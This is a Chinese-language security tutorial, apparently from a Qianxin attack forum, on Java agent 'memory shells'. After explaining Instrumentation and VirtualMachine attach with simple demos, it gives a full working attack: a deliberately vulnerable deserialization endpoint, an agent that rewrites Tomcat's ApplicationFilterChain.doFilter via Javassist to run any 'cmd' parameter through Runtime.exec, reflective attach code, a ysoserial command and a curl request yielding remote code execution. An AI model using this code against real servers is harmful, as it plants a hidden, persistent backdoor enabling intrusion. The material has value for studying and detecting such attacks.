一、什么是agent内存马
=============

Java agent本质上可以理解为一个插件，该插件就是一个精心提供的jar包。只是启动方式和普通Jar包有所不同，对于普通的Jar包，通过指定类的main函数进行启动。但是Java Agent并不能单独启动，必须依附在一个Java应用程序运行，在面向切面编程方面应用比较广泛。 Java agent 的jar包通过JVMTI（JVM Tool Interface）完成加载，最终借助JPLISAgent（Java Programming Language Instrumentation Services Agent）完成对目标代码的修改。主要功能如下：

- 可以在加载java文件之前做拦截把字节码做修改
- 可以在运行期将已经加载的类的字节码做变更
- 比如我们用到过的Jcoco，Arthas, chaosblade等，都是使用Java agent技术来实现

agent内存马的本质就是通过agentmain方法，修改正在运行的Java类，在其中插入恶意直接码，从而达到命令执行

二、前置知识
======

Instrumentation类
----------------

`Instrumentation` 是 `JVMTIAgent`（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 `JVM` 进行交互，从而达到修改数据的效果

### addTransformer方法

该方法定义如下

```java
void addTransformer(ClassFileTransformer transformer);
```

`addTransformer 方法`来用于注册`Transformer（转换器`），所以我们可以通过编写实现 ClassFileTransformer 接口的类，来注册我们自己的转换器，在`agent`**拦截修改**类时，便会调用我们所传入**转换器对象**的`transformer方法`

> Instrumentation 中含有名为 transformer 的 Class 文件转换器，在agent对类进行拦截修改时，便调用该方法，该方法可以改变二进制流的数据

### getAllLoadedClasses方法

该方法定义如下

```java
Class[] getAllLoadedClasses();
```

我们可以通过`getAllLoadedClasses 方法`获取所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class

一个简单的demo

`Agdemo.java`

```java
import java.lang.instrument.Instrumentation;

public class Agdemo {
    public static void premain(String agentArgs,Instrumentation ins){
        Class[] classes=ins.getAllLoadedClasses();
        for(Class c:classes){
            System.out.println(c.getName());
        }
    }
}
```

其他文件仍与上文相同

执行以下命令运行

```shell
java -javaagent:agent.jar=111 -jar hello.jar
```

成功输出所有已加载的类

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-4dd5c089d499f2ec198983bcea8c379bd5d43394.png)

### retransformClasses方法

该方法定义如下

```java
void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
```

`retransformClasses 方法`可以重新定义已加载的 `class` ，当我们想修改一个已经加载的类的时候可以调用该函数，来重新触发这个`Transformer`*（也就是addTransformer注册的转换器的transform方法）*的拦截，以此达到对已加载的类进行字节码修改的效果

VirtualMachine类
---------------

`VirtualMachine` 可以来实现获取系统信息，内存dump、现成dump、类信息统计（JVM加载的类），常用的方法有**LoadAgent**，**Attach** 和 **Detach** 。

**Attach** ：通过jvm的id连接jvm

```java
VirtualMachine vm = VirtualMachine.attach(v.id());
//v为VirtualMachineDescriptor对象，下文有讲
```

**loadAgent**：向Attach方法获取的jvm注册一个代理程序agent

```java
String path = "AgentMain.jar的路径";
vm.loadAgent(path)
```

**Detach**：从 JVM 上面解除一个代理(agent)

VirtualMachineDescriptor类
-------------------------

`VirtualMachineDescriptor` 是一个描述虚拟机的容器类，可以通过VirtualMachine.list()获取，

```java
 List<VirtualMachineDescriptor> list = VirtualMachine.list();
```

常用的方法有

**displayName()**：获取当前jvm运行的主类名

**id()**：获取**当前jvm的`id`**，得到`id`后就可以用`VirtualMachine.attach()`方法通过`id`获得该虚拟机，然后再使用`VirtualMachine.loadAgent()`方法对该`id`注册agent

三、两种agent
=========

Java agent一共分为两种:

**premain 方法**：在jvm启动时执行（该特性在 jdk 1.5 之后才有）

**agentmain方法**：在jvm加载后执行（该特性在 jdk 1.6 之后才有）

> 普通的 Java 类是以 main 函数作为入口，Java Agent 的入口则是 premain 和 agentmain

premain 方法
----------

我们先创建一个类实现 `premain 方法`

`Agdemo.java`

```java
import java.lang.instrument.Instrumentation;

public class Agdemo {
    public static void premain(String agentArgs,Instrumentation ins){
        Class[] classes=ins.getAllLoadedClasses();
        System.out.println(agentArgs);
        for(Class c:classes){
            System.out.println(c.getName()); //测试上文的getAllLoadedClasses方法
        }
    }
}
```

同时创建对应的清单（**main fest**）

`agent.mf` （注意最后一行要为空格）

```mf
Manifest-Version: 1.0
Premain-Class: Agdemo

```

这里补充下mf文件的知识，大致选项如下

```list
Main-Class：包含 main 方法的类（类的全路径名）
Premain-Class: 包含 premain 方法的类（类的全路径名）
Agent-Class: 包含 agentmain 方法的类（类的全路径名）
Boot-Class-Path: 设置引导类加载器搜索的路径列表。查找类的特定于平台的机制失败后，引导类加载器会搜索这些路径。按列出的顺序搜索路径。列表中的路径由一个或多个空格分开。路径使用分层 URI 的路径组件语法。如果该路径以斜杠字符（“/”）开头，则为绝对路径，否则为相对路径。相对路径根据代理 JAR 文件的绝对路径解析。忽略格式不正确的路径和不存在的路径。如果代理是在 VM 启动之后某一时刻启动的，则忽略不表示 JAR 文件的路径。（可选）
Can-Redefine-Classes: true表示能重定义此代理所需的类，默认值为 false（可选）
Can-Retransform-Classes: true 表示能重转换此代理所需的类，默认值为 false （可选）
Can-Set-Native-Method-Prefix: true表示能设置此代理所需的本机方法前缀，默认值为 false（可选）
```

然后使用javac将其编译为class文件

```shell
javac Agdemo.java
```

然后将class文件和mf一起打包为jar，获取代理程序 agent.jar，即为我们的代理程序

```shell
jar cvfm agent.jar agent.mf Agdemo.class
```

然后创建我们被代理的类

`Hello.java`

```java
public class Hello {

  public static void main(String[] args) {

    System.out.println("Hello,World");

  }
}
```

然后创建清单 `Hello.mf`

```mf
Manifest-Version: 1.0
Main-Class: Hello

```

同样将其编译为class文件

```shell
javac Hello.java
```

然后和清单一起打包为jar文件，我们得到被代理的程序 `hello.jar`

```shell
jar cvfm hello.jar Hello.mf Hello.class
```

然后使用java命令，使用`agent代理`运行 `hell.jar`

```shell
java -javaagent:agent.jar=114514 -jar hello.jar
```

成功运行

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-aa5d0e6672194f37c6a057af97b00b9f3fe4deeb.png)

agent方法
-------

`agent代理`的设置与`premain`略有不同，需要用到`VirtualMachine 和 VirtualMachineDescriptor类，`获取其jvm的id，然后对其注册`agent代理`

具体流程如下

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-2942e5c1046c8b21174205b404c169585ba52eeb.png)

我们同样需要创建一个`实现agentmain方法`的类

`Agenttest.java`

```java
import java.lang.instrument.Instrumentation;

public class Agenttest {
    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new MyTransformer(),true); //MyTransformer()类是需要自己编写的
    }
}
```

编写一个实现了`ClassFileTransformer`的转换器类

`MyTransformer.java`

```java
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class MyTransformer implements ClassFileTransformer {
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println(className);
        return classfileBuffer;
    }
}
```

然后创建清单 `agentmain.mf`（注意要留一行空格）

```mf
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: Agenttest

```

然后编译并打包，获得代理程序 `AgentMain.jar`

```php
javac Agenttest.java
javac MyTransformer.java
jar cvfm AgentMain.jar agmain.mf Agenttest.class MyTransformer.class
```

下一步编写我们被代理的类

这个类中需要导入`VirtualMachine 类与VirtualMachineDescriptor类`

这里有些坑：

> mac环境下jdk是能直接找到 VirtualMachine 类
> 
> 但是在windows中jdk中无法找到，可以手动将jdk目录下的lib目录中的tools.jar添加进当前工程的Libraries中
> 
> 并且在Java9及以后的版本不允许SelfAttach(即无法attach自身的进程)，会报错`Can not attach to current VM`，我们在运行时添加参数 `-Djdk.attach.allowAttachSelf=true`即可

创建被代理的类 `Hello.java`

```java
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class Hello {
    public static void main(String[] args) throws Exception{
        String path = "AgentMain.jar的路径";
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor v:list){
            System.out.println(v.displayName());
            if (v.displayName().contains("Hello")){
                // 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接
                VirtualMachine vm = VirtualMachine.attach(v.id());
                // 将我们的 agent.jar 发送给虚拟机 
                vm.loadAgent(path);
                vm.detach();
            }
        }
    }
}
```

成功运行

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-cb7aff795b3b88d0164e6475c22055f67f2a71dc.png)

这里解释下为什么会输出上面四个类

> 当一个类被加载到 JVM 中时，类加载器会通知 Java 虚拟机，然后 Java 虚拟机会调用注册的 ClassFileTransformer 实现类的 transform 方法来处理这个类

1. Hello类就是我们定义的入口类
2. `java.lang.IndexOutOfBoundsException`：这是一个运行时异常类，表示索引越界异常。当试图访问数组、集合或字符串等数据结构中不存在的索引时，就会抛出此异常。通常情况下，这意味着程序试图访问一个超出有效范围的位置。
3. `java.lang.Shutdown`：这是一个用于 JVM 关闭操作的辅助类。它包含一些静态方法，用于注册虚拟机关闭时要执行的动作。例如，可以使用 `addShutdownHook` 方法注册一个关闭挂钩（shutdown hook），以便在 JVM 即将关闭时执行某些清理操作。
4. `java.lang.Shutdown$Lock`：这是 `Shutdown` 类中的内部静态类，用于实现对 JVM 关闭操作的同步锁定。在 JVM 关闭过程中，需要确保对关闭操作的同步执行，以避免并发问题，`Shutdown$Lock` 类就是为此而设计的。

上面的2,3,4类都是JVM在运行时必加载的基础类

四、Agent内存马实现
============

因为实战环境中我们说攻击的jvm虚拟机肯定都是**已经启动**的，故`premain`无法使用，所以我们需要通过`agentmain`，调用`Instrumentation.retransformClasses()方法`，调用我们自定义的`transform转换器`，重转换一个**一定会被执行的类**，并且往这个类中插入恶意字节码**不影响其原来的业务逻辑**

ApplicationFilterChain类
-----------------------

ApplicationFilterChain类中的doFilter方法便是我们要寻找的要注入内存马的类

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-c8cb8fe35db13c04282cb968d4b2af25be587f50.png)

当我们向`tomcat服务器`发送一个请求，一定会经过`Filter`

> 在 Java Web 中，Filter 是一种用于在 Servlet 被调用之前或之后对请求进行预处理或后处理的组件。它允许开发人员在 Servlet 的请求处理过程中添加额外的逻辑，而无需修改 Servlet 本身

在请求经过Filter时便会调用doFilter方法

> `doFilter` 方法是 Filter 接口中的一个方法，用于对请求进行过滤处理。具体来说，它的作用包括：
> 
> 1. **预处理请求**：在 Servlet 被调用之前，Filter 的 `doFilter` 方法会被调用，开发人员可以在这里对请求进行预处理，例如验证请求参数、检查用户身份、设置字符编码等。
> 2. **调用下一个 Filter 或 Servlet**：在对请求进行预处理之后，Filter 的 `doFilter` 方法通常会调用 `FilterChain` 的 `doFilter` 方法，将请求传递给下一个 Filter 或 Servlet。这样可以形成 Filter 链，多个 Filter 可以依次对请求进行处理。

漏洞复现
----

这里用`cc 3.2.1 +springframework`的环境，利用cc链11给提供web服务的对象注册agent代理

创建漏洞类 `CommonsCollectionsVuln.java`

```java
package org.example.agentmm.demos.web;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ObjectInputStream;

@Controller
public class CommonsCollectionsVuln {

    @ResponseBody
    @RequestMapping("/cc")
    public String cc11Vuln(HttpServletRequest request, HttpServletResponse response) throws Exception {
        java.io.InputStream inputStream =  request.getInputStream();
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        objectInputStream.readObject();
        return "Hello,World";
    }

    @ResponseBody
    @RequestMapping("/test")
    public String demo(HttpServletRequest request, HttpServletResponse response) throws Exception{
        return "This is Elite!";
    }
}
```

然后在`pom.xml`中添加依赖项如下

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
```

下一步创建`agentmain代理`，作用是：`遍历找到要攻击类对应的JVM中的ApplicationFilterChain类`,然后对其进行重定义

`AgentMain.java`

```java
import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new MyTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}
```

然后创建我们的转换器，其作用是如果传入的类为`ApplicationFilterChain`，则对其`doFilter方法`插入恶意字节码

`MyTransformer.java`

```java
import javassist.*;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {

    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace("/",".");
        if (className.equals(ClassName)){
            System.out.println("Find the Inject Class: " + ClassName);
            ClassPool pool = ClassPool.getDefault();
            try {
                CtClass c = pool.getCtClass(className);
                CtMethod m = c.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                        "javax.servlet.http.HttpServletResponse res = response;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] bytes = c.toBytecode();
                // 将 c 从 classpool 中删除以释放内存
                c.detach();
                return bytes;
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
```

执行以下命令，对项目打包为 `agent.jar`

```php
mvn assembly:assembly
```

然后我们构造cc链11反序列化执行的代码

> tools.jar 并不会在 JVM 启动时默认加载，所以这里利用 URLClassloader 来加载我们的 tools.jar

该代码的作用是找到当前受攻击类的JVM然后对其注册agent

`Test.java`

```java
try{
    java.lang.String path = "C:/Users/Elite/Desktop/agent.jar";
    java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
    java.net.URL url = toolsPath.toURI().toURL();
    java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
    Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
    Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
    java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
    java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

    System.out.println("Running JVM list ...");
    for(int i=0;i<list.size();i++){
        Object o = list.get(i);
        java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
        java.lang.String name = (java.lang.String) displayName.invoke(o,null);
        // 列出当前有哪些 JVM 进程在运行 
        // 这里的 if 条件根据实际情况进行更改
        if (name.contains("org.example.agentmm.demos.web.Applicationmain")){
            // 获取对应进程的 pid 号
            java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
            java.lang.String id = (java.lang.String) getId.invoke(o,null);
            System.out.println("id >>> " + id);
            java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
            java.lang.Object vm = attach.invoke(o,new Object[]{id});
            java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
            loadAgent.invoke(vm,new Object[]{path});
            java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
            detach.invoke(vm,null);
            System.out.println("Agent.jar Inject Success !!");
            break;
        }
    }
} catch (Exception e){
    e.printStackTrace();
}
```

然后用yso生成cc链

```php
java -jar ysoserial.jar CommonsCollections6 codefile:./Test.java > cc11demo.ser
```

最后使用curl访问发包即可

```php
curl -v "http://localhost:8080/cc11" --data-binary "@./cc11demo.ser"
```

我们访问传参测试，成功rce

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-7f157593ede9967736dfd6de3f98973ddd6654eb.png)